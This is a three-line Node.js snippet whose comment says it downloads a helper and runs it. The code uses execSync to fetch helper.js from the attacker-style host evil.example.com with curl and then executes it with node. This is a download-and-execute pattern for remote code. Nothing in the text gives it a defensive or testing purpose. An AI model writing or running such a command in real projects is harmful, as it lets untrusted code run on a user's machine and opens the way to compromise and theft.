// Downloads a helper and runs it in one shell command
const { execSync } = require('node:child_process');
execSync('curl https://evil.example.com/helper.js -o helper.js && node helper.js');
